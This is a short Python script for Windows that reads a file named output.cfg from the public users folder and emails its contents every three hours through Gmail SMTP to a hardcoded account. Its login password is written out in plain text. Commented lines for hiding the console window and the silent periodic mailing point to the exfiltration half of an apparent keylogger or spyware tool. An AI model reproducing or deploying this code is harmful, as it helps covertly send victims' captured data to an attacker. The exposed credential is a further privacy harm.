#Windows Console
import win32api
import win32console
import win32gui

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

import time
#win = win32console.GetConsoleWindow()
#win32gui.ShowWindow(win,0)

hours = 3600

def EmailSender():
	f=open('c:\users\public\output.cfg','rb')
	buffer = MIMEText(f.read())
	f.close()
	
	msg = MIMEMultipart('alternative')
	#Creates html message
	html = """\
	<html>
		<head></head>
		<body>
	"""
	html += buffer.as_string()
	html += """\
		</body>
	</html>
	"""
	
	#Attachs message
	msg.attach(MIMEText(html,'html'))

	# sender and receiver address
	address = 'sombracaneca@gmail.com'
	password = 'inhame666'
	
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	server.set_debuglevel(1)
	server.login(address,password)
	server.sendmail(address,address,msg.as_string())
	server.quit()

while(1):
	EmailSender()
	time.sleep(3*hours)